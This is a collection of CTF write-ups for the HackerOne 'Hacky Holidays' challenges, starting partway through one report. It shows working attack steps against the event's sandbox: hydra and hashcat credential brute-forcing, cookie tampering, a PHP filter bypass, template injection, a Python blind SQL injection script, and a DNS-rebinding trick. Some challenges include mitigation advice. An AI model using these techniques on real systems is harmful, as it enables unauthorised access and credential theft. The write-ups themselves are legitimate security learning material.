1../api/user?name=chron0x Expected HTTP status 200, Received: 400
2../api/user?username=chron0x Expected HTTP status 200, Received: 204
As we have seen from the previous table, response 204 means Successful request but with no data found. This means we found the username parameter. The next step would be to find a valid username. First, let's see if any character can give us a different response. Iterating through all ASCII characters we find:
Code 178 Bytes
1../api/user?username=a Expected HTTP status 200, Received: 204
2../api/user?username=b Expected HTTP status 200, Received: 204
3../api/user?username=% Invalid content type detected
In hope that the % character behaves as a wildcard, we can try if we can brute-force the first character of a username. Indeed, we can the following username:
Code 711 Bytes
1../api/user?username=g% Invalid content type detected
2../api/user?username=gr% Invalid content type detected
3../api/user?username=gri% Invalid content type detected
4../api/user?username=grin% Invalid content type detected
5../api/user?username=grinc% Invalid content type detected
6../api/user?username=grinch% Invalid content type detected
7../api/user?username=grincha% Invalid content type detected
8../api/user?username=grinchad% Invalid content type detected
9../api/user?username=grinchadm% Invalid content type detected
10../api/user?username=grinchadmi% Invalid content type detected
11../api/user?username=grinchadmin% Invalid content type detected
12../api/user?username=grinchadmin Invalid content type detected
grinchadmin it is. Well, we already found a method to brute-force the username. Let's try if we can apply the same approach for a password. However, at this step, we have to be cautious, since we do not know how to connect the two parameters.
Code 153 Bytes
1../api/user?username=grinchadmin&test=chron0x Invalid data format
2../api/user?username=grinchadmin%26test=chron0x Expected HTTP status 200, Received: 400
As we can see, we should use the URL-encoded variant. Again through either an educated guess or through brute-force, we can find the password parameter.
Code 179 Bytes
1../api/user?username=grinchadmin%26pass=chron0x Expected HTTP status 200, Received: 400
2../api/user?username=grinchadmin%26password=chron0x Expected HTTP status 200, Received: 204
With the same procedure as before, we can brute-force the password.
Code 975 Bytes
1../api/user?username=grinchadmin%26password=% Invalid content type detected
2../api/user?username=grinchadmin%26password=s% Invalid content type detected
3../api/user?username=grinchadmin%26password=s4% Invalid content type detected
4../api/user?username=grinchadmin%26password=s4n% Invalid content type detected
5../api/user?username=grinchadmin%26password=s4nt% Invalid content type detected
6../api/user?username=grinchadmin%26password=s4nt4% Invalid content type detected
7../api/user?username=grinchadmin%26password=s4nt4s% Invalid content type detected
8../api/user?username=grinchadmin%26password=s4nt4su% Invalid content type detected
9../api/user?username=grinchadmin%26password=s4nt4suc% Invalid content type detected
10../api/user?username=grinchadmin%26password=s4nt4suck% Invalid content type detected
11../api/user?username=grinchadmin%26password=s4nt4sucks% Invalid content type detected
12../api/user?username=grinchadmin%26password=s4nt4sucks Invalid content type detected
We successfully brute-forced the credentials: grinchadmin:s4nt4sucks. To get the flag and to the next challenge, we can use the credentials to log in into the attack-box (/attack-box).
Flag 12 Attack Box: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
At this stage, we are logged into the Grinch's attack server. From here we can start a DDOS attack at three of Santas' servers. The objective of this challenge is to reroute this DDOS attack toward the Grinch's server, in other words to localhost. Launching an attack against any of the servers, the following request is send: /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==. Decoding the base64 reveals: {"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}. For all three servers, this results in:
Code 204 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
2{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
3{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
The hash parameter appears to be an MD5-hash. Tinkering with either the target or hash parameter results in the response: Invalid Protection Hash. This tells us that some sort of validation of the target and hash parameter is performed. Since the target does not directly translate to the hash, we can guess that it is a salted hash. We can try to crack the hash with hashcat. Therefore, we store our information in the form $pass:$salt into a file called hash.txt:
Code 138 Bytes
15f2940d65ca4140cc18d0878bc398955:203.0.113.33
22814f9c7311a82f1b822585039f62607:203.0.113.53
35aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
Now we can proceed to try to crack the hashes with
Code 69 Bytes
1hashcat -m10 -O -o hash.out hash.txt /usr/share/wordlists/rockyou.txt
Here -m10 stands for our selected format, as to how we stored the hashes in our file. After executing this we can view the outputs in the file hash.out:
Code 174 Bytes
15f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
22814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
35aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
We successfully cracked the hashes and are now able to generate our payloads. As a quick sanity check we can confirm that the MD5 of mrgrinch463203.0.113.33 is indeed 5f2940d65ca4140cc18d0878bc398955. So lets redirect the attack against 127.0.0.1 with the following payload {"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}, with 3e3f8df1658372edf0214e202acb460b being the MD5 for mrgrinch463127.0.0.1. Launching the attack with /attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ== and visiting https://hackyholidays.h1ctf.com/attack-box/launch/5867c35a78d569fea1d4ac81ae55e2e1, we can see that:Local target detected, aborting attack. This means there is a detection in place, such that we do not attack ourselves. It would be great if we first could pretend that we are the target IP and then switch to the localhost. We can achieve exactly this with a DNS rebinding attack. I used the following service. What it does is: "The hostname generated will resolve randomly to one of the addresses specified with a very low time to live record." We insert our two IP addresses of choice 203.0.113.33 and 127.0.0.1 we receive the following address: cb007121.7f000001.rbndr.us. With dig A cb007121.7f000001.rbndr.us we can confirm that the address indeed resolves to any of the two domains randomly:
Code 92 Bytes
1cb007121.7f000001.rbndr.us. 1	IN	A	203.0.113.33
2cb007121.7f000001.rbndr.us. 1	IN	A	127.0.0.1
Again we can construct a new payload and base64 encode it:
Code 190 Bytes
1{"target":"cb007121.7f000001.rbndr.us","hash":"aa9c061c933f709acb4d69329bc7b1af"}
2eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9
With the following path we can launch our attack: /attack-box/launch?payload=eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9. The attack might not be successful on the first try, but after a few attempts the DNS rebinding attack is successful and we are knocking off the Grinch's server, and getting reconnected to https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 were we are presented with the final flag.
Impact
Positive impact on my life.



==================================================

Report File: 1066206.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

Flag 1
As always CTF begins with a tweet:
<image_0>
So we are supposed to start from https://hackyholidays.h1ctf.com/ .
The first flag was easy on https://hackyholidays.h1ctf.com/ I found a file named robots.txt which had the following content:
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
Flag 2
From flag 1 we found /s3cr3t-ar3a path so we try to visit this on the main website. https://hackyholidays.h1ctf.com/s3cr3t-ar3a, weget the following website:
<image_1>
Checking out the source using the Ctrl+U doesn't shows the flag. But if we open the developers option(ctrl+shift+e in firefox and ctrl+shif+i in chrome) in the source we can see the following lines:
Code 267 Bytes
1<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
2	<p>I've moved this page to keep people out!</p>
3	<p>If you're allowed access you'll know where to look for the proper page!</p>
4</div>
And here we can see our flag:
Code 42 Bytes
1flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
<image_2>
Why didn't we saw the flag in the source code?
This is because the data-* attributes are used to store data in private to the page or the application. And when we "view-source" of any webpage we see the HTML as it was delivered from the web server to our browser. That means we won't see any private HTML attribute, in our case data-info. But when we Inspect Element using the developer options that time we are looking at the current state of the DOM tree after:
HTML error correction by the browser
HTML normalization by the browser
DOM manipulation by JavaScript
and after all this we are able to see even the private attributes set in the HTML.
Flag 3
For this flag we start from the initial page i.e https://hackyholidays.h1ctf.com/. There we see that a new button has appeared now. Clicking on that button we are taken to /people-rater path on the website.
The people-rater page looks like:
<image_3>
If we click on any button on any name we get an alert with certain rating in return. Ex if we click on Tea Avery we get an alert box saying Awful
<image_4>
If we look at the source code of the page we can see the following ajax code:
Code 769 Bytes
1<script>
2    $('.thelist').on("click", "a", function(){
3        $.getJSON('/people-rater/entry?id=' + $(this).attr('data-id'), function(resp){
4            alert( resp.rating );
5        }).fail(function(){
6            alert('Request failed');
7        });
8    });
9    var page = 0;
10    $('.loadmore').click( function(){
11        page++;
12        $.getJSON('/people-rater/page/' + page, function(resp){
13            if( resp.results.length < 5 ){
14                $('.loadmore').hide();
15            }
16            $.each( resp.results, function(k,v){
17                $('.thelist').append('<div style="margin-bottom:15px"><a class="btn btn-info" data-id="' + v.id + '">' + v.name + '</a></div>')
18            });
19        });
20    });
21    $('.loadmore').trigger('click');
22</script>
We can see that whenever we click on any name/button the data-id is taken out and a request is sent to HOST/people-rater/entry?id=<data-id-value> and the rating is then presented to us on the alert box.

Now the interesting thing here is that all the data-id are in base64 encoded. If we click on the very first name i.e Tea Avery we will see that request is sent to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0= this URL. If we decode the base64 value i.e eyJpZCI6Mn0= we will get {"id":2}. The moment you see this it hits you that why the very first name on the website have the id set to 2 and not 1 or 0.
So we check that who is being assigned the id:1 that can be done by encoding {"id":1} in base64 which will give you eyJpZCI6MX0=.
If we send the request to https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
<image_5>
Code 42 Bytes
1flag{b705fb11-fb55-442f-847f-0931be82ed9a}
Flag 4
For 4th flag we start from https://hackyholidays.h1ctf.com/ and we can see in the app section a new Swag Shop button is available.
When we click on that button we get an information alert on that page:
Code 101 Bytes
1Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
Once we start the challenge we are taken to https://hackyholidays.h1ctf.com/swag-shop
<image_6>
If we click on any of these buttons we get an alert asking for login, which we don't have. After looking through the source of the page and some requests I found out that the login request was going on https://hackyholidays.h1ctf.com/swag-shop/api/login so I tried to find if there is any endpoint for register but didn't find any.
Then I decided to FUZZ to see if I can find any other page. For fuzzing I used ffuf with dirsearch's wordlist i.e dicc.txt.
<image_7>
So we found a path /sessions, if we open that in a browser we get the a dictionary/JSON having some session values:
<image_8>
Initially it looked like JWT token to me but then I saw that they were long base64 encoded strings. I decoded them and all of them had the user set to null except 1.
Code 308 Bytes
1eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==
If we decode this we get:
Code 229 Bytes
1{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
Now we know the user value so we can try to visit the /user endpoint we found and see if we can find the flag.
<image_9>
If we visit that endpoint we get an error saying value is missing that means we need to try to send the user value on this endpoint. I tried to use parameter like id, username, user but none of those worked. I then figured out that the user value we got after decoding was in uuid so I tried to pass that value as uuid= and it worked.
<image_10>
Code 42 Bytes
1flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
Flag-5
For this flag we start from https://hackyholidays.h1ctf.com/secure-login. If we visit that page we get a login form. I spent some time trying to find the ways to bypass this login but couldn't. But then I noticed that the whenever we enter just the username it didn't ask us to also enter the password and returned the error Invalid Username. Now this gave me a slight hint that brute force of the crendentials was required.
I used hydra to get the correct username and password.
For getting the usernames I used this(Seclist/names.txt) wordlist:
Code 141 Bytes
1hydra -L names.txt -p password -t 64 hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Username"
-L means the username list
-p is the fixed string which will be used in the password field.
-t 64 means the number of threads
after that we provide the HOST to attack on
https-post-form is the module used for this attack
/secure-login:username=^USER^&password=^PASS^:Invalid Username
The breakdown of this string is in the following format:
{path where the attack is going to happen}:{name of the field in which username will be placed}={the usernames from the names.txt}&{name of the field in which password will be placed}=^{value of password}^:{Error message which shows the wrong username was used}
The breakdown of this string is in the following format:
{path where the attack is going to happen}:{name of the field in which username will be placed}={the usernames from the names.txt}&{name of the field in which password will be placed}=^{value of password}^:{Error message which shows the wrong username was used}
<image_11>
Now we have the username lets use this to find the correct password. For finding the correct password I used, rockyou.txt
The hydra command would be:
Code 141 Bytes
1hydra -l access -P rockyou.txt -t 64 hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Password"
<image_12>
Now we have username and password, using these credentials I logged in but got the following page:
<image_13>
I was bit confused and wasn't sure what I have to do. I tried looking for the flag everywhere, in the source of the page, via the inspector of developer tools but couldn't find it. After spending sometime looking I noticed something, the cookie that was being set after the valid login looked like:
Code 102 Bytes
1Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D
This looked like a base64 encoded string so I decoded it and got:
Code 164 Bytes
1-> echo "eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=" | base64 -d
2{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}  
That means I have to change the value of admin to true.
Code 158 Bytes
1-> echo "{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}" | base64
2eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
This is our new encoded cookie, if we use this to send the request on /secure-login endpoint we will see a new file listed on the webpage with the name my_secure_files_not_for_you.zip
<image_14>
I downloaded that file but it was password protected. This mean we have to crack the password of this ZIP file. For this task I used one of the utility of JTR i.e zip2john
Code 55 Bytes
1-> zip2john my_secure_files_not_for_you.zip > hash.txt 
Then I ran john on hash.txt to crack the password:
Code 16 Bytes
1-> john hash.txt
Once the password was cracked I ran john --show hash.txt to see the password.
<image_15>
Using this password I opened the ZIP file which had two files:
flag.txt
xxx.png
The flag was in flag.txt
Code 42 Bytes
1flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Flag 6
We see another tweet from HackerOne:
<image_16>
That means for flag-6 we are going to hack grinch's diary.
We start from the home page and in the app section there is new challenge added named my-diary. If we start the challenge we are taken to https://hackyholidays.h1ctf.com/my-diary/?template=entries.html. Now there wasn't anything interesting in the page source so I started looking in the networks tab to see if I could find anything.
After baning my head on this for few hours I talked with my friend from OpenToAll team, neolex. They gave me a hint by saying think "where I am". First of all it seemed like a really bad hint but then I realized currently in the URL we are including a template named entries.html and we are on the index page. So I tried to include the index.php in place of entries.html and I got a empty page but in the source of that page was the php code:
Code 690 Bytes
1
2<?php
3if( isset($_GET["template"])  ){
4    $page = $_GET["template"];
5    //remove non allowed characters
6    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
7    //protect admin.php from being read
8    $page = str_replace("admin.php","",$page);
9    //I've changed the admin file to secretadmin.php for more security!
10    $page = str_replace("secretadmin.php","",$page);
11    //check file exists
12    if( file_exists($page) ){
13       echo file_get_contents($page);
14    }else{
15        //redirect to home
16        header("Location: /my-diary/?template=entries.html");
17        exit();
18    }
19}else{
20    //redirect to home
21    header("Location: /my-diary/?template=entries.html");
22    exit();
23}
Now if we look at this source code we can see the comments says that the admin.php has been replaced with secretadmin.php but if we try to include that page it will go back to entries.html because there is a check in that source code.
Code 91 Bytes
1$page = str_replace("admin.php","",$page);
2$page = str_replace("secretadmin.php","",$page);
These lines in the code replaces the admin.php or secretadmin.php with "" i.e empty string.
So we need to pass a string in such a manner that even after both of these replacements are done we'll still get secretadmin.php. To do this I decided to locally test this process.
Code 172 Bytes
1<?php
2
3$page = "secretsecretadadmin.phpmin.phpadadmin.phpmin.php";
4$page = str_replace("admin.php", "", $page);
5$page = str_replace("secretadmin.php","",$page);
6echo $page;
This is the code that returned secretadmin.php even after replacements.
So if we visit https://hackyholidays.h1ctf.com/my-diary/?template=secretsecretadadmin.phpmin.phpadadmin.phpmin.php we will get our flag and we can clearly see the motives of the Grinch.
<image_17>
Mitigation
As we can see that using str_replace caused the issue and resulted in giving access to the place where an attacker should be. That it is better to avoid using such functions for a functionality like including a file.
A better check which would have prevented from any accessing sensitive files, in our case secretadmin.php or even index.php would be to have a white list of all the files that you would like to allow access to and if any other file is present then just show 403 or redirect to default page.
Ex:
Code 93 Bytes
1if (in_array($page, $WHITE_LIST_ARRAY)) {
2	// include the page or do whatever is to be done
3}
Flag 7
Another day another tweet:
<image_18>
For this flag we had to start with the hate-mail-generator(https://hackyholidays.h1ctf.com/hate-mail-generator). We can see that there is a create button and other than that there is an existing hate-mail. The existing hate-mail looks like:
<image_19>
Even though we can't edit this message we can try to create a new one.
If we try to create a new one we get an error saying we don't have enough credits to do that but one thing to notice is that {{name}} is automatically converted to Alice when we preview our new mail. After trying lot of Template injection payload I came to the conclusion that this has nothing to do with SSTI. But when I trying loads of stuff here I noticed an error, if we trying any payload like: {{template:RANDOMTHINGS}}
Code 47 Bytes
1Cannot find template file /templates/hashadhasd
So I tried to visit the https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and this gives us the list of all the available templates:
<image_20>
When I tried to include that it gave error about permissions. After spending sometime on the hate-mail-generator/new I noticed something in the source code:
Code 246 Bytes
1<form method="post" action="/hate-mail-generator/new/preview" id="previewfrm" target="_blank">
2    <input type="hidden" name="preview_markup">
3    <input type="hidden" name="preview_data" value='{"name":"Alice","email":"alice@test.com"}'>
4</form>
Here we can see that name was defined and that is why it was we get Alice whenever we use {{name}}. We can confirm that this data was being used by trying {{email}} and it will be replaced by alice@test.com when we preview it.
So I thought since this data was being processed I started to inject various things inside this but the max I got from this was simple HTML injection and nothing big. Using this information and the name of the template that I found before I thought maybe we can try to include that template.
First I tried value='{"name":"38dhs_admins_only_header.html","email":"admin@test.com"}' but it directly printed the name of that template without rendering it. And that's when I realized that to render any template the website is using the format, {{template:<TEMPLATE_NAME>}} so that's what I did.
On /hate-mail-generator/new I inspected the element and edited the preview_data to the following:
Code 86 Bytes
1value='{"name":"{{template:38dhs_admins_only_header.html}}","email":"admin@test.com"}'
and then in the form I added Hi {{name}} and BOOM 💥
<image_21>
Code 42 Bytes
1flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Mitigation
Well this is something definitely what the admin of the website wanted obviously because this double template stuff is not that would arise in real world but if it may then the best way to fix it is:
1) Don't enable directory listing on of the directory that might contain any kind of sensitive information
2) Don't allow the user to render any kind of input
1) Not this can be argued that if a website is some forum or something similar which gives the user to improve/beautify their profile. But even in that case the developers should makes sure that all the user inputs are sanitized properly.
Flag 8
<image_22>
Looks like we are hacking the grinch's forum this time.
For this flag grinch has supposedly setup a forum and the endpoint for this challenge is /forum/. We are supposed to access the admin section of this forum
There seems to be some existing post about christmas and some good things to do but those doesn't have anything special which might hint toward something that we want. After looking through network tab and source of all the pages, I started to FUZZ to see if I find anything hidden.
<image_23>
We can see that there is also an endpoint called phpmyadmin. But even after fuzzing I couldn't find anything else. The phpmyadmin page was secured by login page as well. So after banging my head for a while I asked for a hint from my friend neolex and he said OSINT is going to help. With this in mind I googled lot of things related to the forum and phpmyadmin but nothing was giving it away but then I found something interesting. I googled grinch forum github and almost at the end of the search page saw something interesting.
<image_24>
AFAIK adamtlangley is the one who made these challenges and we can see that he did a commit to a repo named Grinch-Networks/forum. So I cloned that repo and started going through the code because that was the code of the forum app.
In that I found a commit which had the credential(common mistake among devs)
<image_25>
So I used these to login into the /phpmyadmin and there I found credentials for two other users:
<image_26>
And among these the user grinch is the admin. But the thing is these are not the passwords but the md5 of the real password. To find the password of the md5 I used crackstation.net.
<image_27>
So that means the password for grinch is BahHumbug. Once we login with these credentials we'll see a new post in the Admin section, named Secret Plans and that's where we'll find the flag.
<image_28>
Code 42 Bytes
1flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
Flag 9
<image_29>
So Now there is a new Quiz released which tells you wether you are as evil as the Grinch. We are supposed to take the quiz here(https://hackyholidays.h1ctf.com/evil-quiz)
The page have three tabs first ask your name then on clicking next you are taken to /evil-quiz/start and the quiz ask 3 questions and then it shows your score on /evil-quiz/score. Initially I didn't notice anything different in this flow so I went to admin login page at /evil-quiz/admin but I didn't find any credentials so login directly wasn't an option.
Since the login page didn't seemed to give away anything I started to try all sorts of payload on the name field of the quiz. I tried everything some basic SSTI, XSS , SQLi payload and that's when I noticed something. Everytime we set some query like grinch' or '1'='1, in the score we'll see that There is 30000 other player(s) with the same name as you! and if we try grinch' or '1'='2 we'll get There is 265 other player(s) with the same name as you!. This tells us that we are dealing with a Boolean Based SQL injection.
What is Boolean based SQLi?
This is a type of SQL Injection using which an attacker can know whether the SQLi payload they tried worked on the DB or not., depending on the HTTP response received. The payload will not directly return data from the DB but the HTTP response can be used to further exploit the information.
What we as an attacker can do?
In our case a value greater than 30000 represent TRUE or SUCCESS and the value aroudn 200 represents FALSE
So we can try to run payload which has the following format:
Code 81 Bytes
1grinch' or '1'='(Select column_name FROM all_tables WHERE table_name like 'a%')--
Now if we get something in 6 digits that means there is a table name starting with a and that way we will have to test all the characters/numbers.
Since now we know what this is we need to do the following:
1) Find the table name in which the admin credentials could be stored
2) Then find the column names in that table
3) Finally find the correct password for those.
The first query that I tried was
Code 97 Bytes
1grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'a%' LIMIT 0,1) -- -
And I got a 6 digit number showing that there was a table name starting with a and that's when I guessed it that since we are looking for admin password lets see if there is a table name admin
so I did:
Code 100 Bytes
1grinch' or 1=( SELECT 1 FROM information_schema.tables WHERE table_name like 'admin' LIMIT 0,1) -- -
And again got a 6 digit number mean my guess was right. Now we need to find the column_names again for this one I first tried to see if there was any column name username in the admin table.
Code 129 Bytes
1grinch' or 1=( SELECT 1 FROM information_schema.columns WHERE table_name='admin' AND column_name like 'username%' LIMIT 0,1) -- -
This also returns the 6 digit number so this time I used password% and got confirmation that such column exists.
So far we have found that there is a table named admin which have column names username and password. Now again for guessing the username I thought it would be nice to try some normal usernames like grinch or admin.
I tried this and got the 6 digit number showing that there is a username admin
Code 78 Bytes
1grinch' or 1=( SELECT 1 FROM admin WHERE username like 'admi%' LIMIT 0,1) -- -
So that means the username is admin but password will be hard to guess so I'll decided to write the code:
Code 1.17 KiB
1import re
2import requests
3
4URL = "https://hackyholidays.h1ctf.com/evil-quiz"
5strings = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$&\'()*+,-./:;@_"
6username = ""
7
8while True:
9    print("password: ", username)
10    for i in strings:
11        cookies = {
12            "session": "1c0c8fea0d49a4e09317092fa1dbef21",
13            "expires": "Tue, 22-Dec-2020 11:03:29 GMT",
14            "Max-Age": "86400",
15            "path": "/evil-quiz",
16        }
17        payload = {
18                "name": "grinch' or 1=( SELECT 1 FROM admin WHERE password LIKE BINARY '{}%') -- -".format(
19                (username+i)
20            )
21        }
22        print("Trying: ", payload["name"])
23        r = requests.post(URL, cookies=cookies, data=payload)
24
25        start_url = URL + "/start"
26        data = {"ques_1": "0", "ques_2": "0", "ques_3": "0"}
27        r = requests.post(start_url, cookies=cookies, data=data)
28
29        search = re.search(
30            b'<div style="margin-top:20px">There(.*)</div>', r.content, re.IGNORECASE
31        )
32        number = len(search.group(1).split()[1])
33
34        if number > 5:
35            username = username + i
36            break
37        else:
38            continue
39
<image_30>
With this script I was able to find the password, S3creT_p4ssw0rd-$. Now using these credentials(admin:S3creT_p4ssw0rd-$) I logged in and found the flag.
<image_31>
Mitigation
Even though we had to do quite a lot of things in this in the end it is actually a SQLi so I think the best way to fix this is just to sanitize the user input properly.
Flag 10
<image_32>
According to the H1 tweet The Grinch is recruiting for his evil army and we were given a new signup page for that.
<image_33>
We can see that there is option for signup as well as login. In the source of that page I found the following comment:
Code 70 Bytes
1<!-- See README.md for assistance -->
2<!DOCTYPE html>
3<html lang="en">
This means that there could be a file name README.md on the server so I tried to visit /signup-manager/README.md and a markdown file was downloaded and had the following content in it:
Code 704 Bytes
1# SignUp Manager
2SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
3
4### How to Install
51) Create a directory that you wish SignUp Manager to be installed into
62) Move signupmanager.zip into the new directory and unzip it.
73) For security move users.txt into a directory that cannot be read from website visitors
84) Update index.php with the location of your users.txt file
95) Edit the user and admin php files to display your hidden content
106) You can make anyone an admin by changing the last character in the users.txt file to a Y
117) Default login is admin / password
In this we can see that some kind of signUp Manager is used to store the users. The important points to notice are 2 and 6, because 2 point tells us that there is a file named signupmanager.zip on the server. And 6th point tells us that if last character is Y for any user then that user will be admin(what we need to get the flag).
First I downloaded the zip file and that had the source of the signupmanager app.
The important function in the index.php was addUser
Code 531 Bytes
1function addUser($username,$password,$age,$firstname,$lastname){
2    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
3    $line = '';
4    $line .= str_pad( $username,15,"#");
5    $line .= $password;
6    $line .= $random_hash;
7    $line .= str_pad( $age,3,"#");
8    $line .= str_pad( $firstname,15,"#");
9    $line .= str_pad( $lastname,15,"#");
10    $line .= 'N';
11    $line = substr($line,0,113);
12    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
13    return $random_hash;
14}
What is happening here is that all the inputs are getting padded with the # to make them of a certain length and right before writing them in the users.txt it's made sure that the line is of length 113. We can also see that last character of every line will be N meaning none of the new user will be admin. After looking at this function I started looking at the code from where addUser function is getting called.
Code 976 Bytes
1if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
2            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
3			.....
4			.....
5            $password = md5($_POST["password"]);
6            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
7            .....
8			.....
9			$lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
10            .....
11			.....
12			if (!is_numeric($_POST["age"])) {
13                $errors[] = 'Age entered is invalid';
14            }
15            if (strlen($_POST["age"]) > 3) {
16                $errors[] = 'Age entered is too long';
17            }
18            $age = intval($_POST["age"]);
19            if (count($errors) === 0) {
20                $cookie = addUser($username, $password, $age, $firstname, $lastname);
21				.....
22				.....
23            }
24        }
Now before we dive in the source code we will have to understand that if all the new user added have N at the end then the only way to become an admin is to find a way to overflow any one of the input field and have Y as the end character so that when the addUser function call the substr($line,0,113); the last character will be Y
Let's look at the source code which is calling the addUser function:
The username, firstname and lastname should be less than 15 length, if they'll be more than that then only the starting 15 characters will be considered so we can't just overflow one of these.
If we look at the password field we can see md5() is being calculated that means no matter what we enter as the password the md5 will result in something else and won't give us what we want
Now age is the only field that doesn't have any substr check. But there are few other checks on the age field.
Code 74 Bytes
1if (!is_numeric($_POST["age"])) {
2	$errors[] = 'Age entered is invalid';
3}
This makes sure that the age value is a numeric so we can't have 100Y
Code 74 Bytes
1if (strlen($_POST["age"]) > 3) {
2	$errors[] = 'Age entered is too long';
3}
This check make sure that the age shouldn't be greater than 3.
Code 29 Bytes
1$age = intval($_POST["age"]);
This is not a check but this make sure that the age value is int type.
I started playing with is_numeric and intval function locally and I found the way to solve this. If we enter something like 1e1 both the function clears it. why? Because 1e1 is a exponential number.
<image_34>
So if we can enter something like 1e3 the is_numeric function will clear it and the strlen will also clear it cause it's exactly 3 length but when we will get to the intval function it will change 1e3 to 1000.
<image_35>
DAMN YOU PHP
What do we have to do to get the flag?
1) Set the last name to string with length 15 but the last character should be Y
2) set the age to 1e3
You can use burp suite to capture the request and send it but I used the dev tools and my post data looked like:
Code 89 Bytes
1action=signup&username=mzfr&password=mzfr&age=1e3&firstname=mzfr&lastname=mzfrmzfrmzfrmzY
and this will add a new user named mzfr with the password mzfr and admin privileges.
<image_36>
This is the best challenge till now, I just loved it cause I learned new things about PHP and I know why I have to stay away from it 😝
Mitigation
1) I think it's better to just stick with Database for storing users, just sanitize the stuff.
2) In this challenge we saw that is_numeric and intval messed things up, it would have been nice if the strlen check was done after intval, that would have just prevented overflow
3) Also in place of is_numeric it would much secure if ctype_digit would have been used. In the ctype_digit the 1e3 would have returned 0(false).
Flag 11
<image_37>
In the flag 10 we saw that we were given a new URL https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59
I have no words about this challenge. If we start looking at the URL we see a list of albums
<image_38>
If we check all those URLs all we can see that there are images in the format: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k
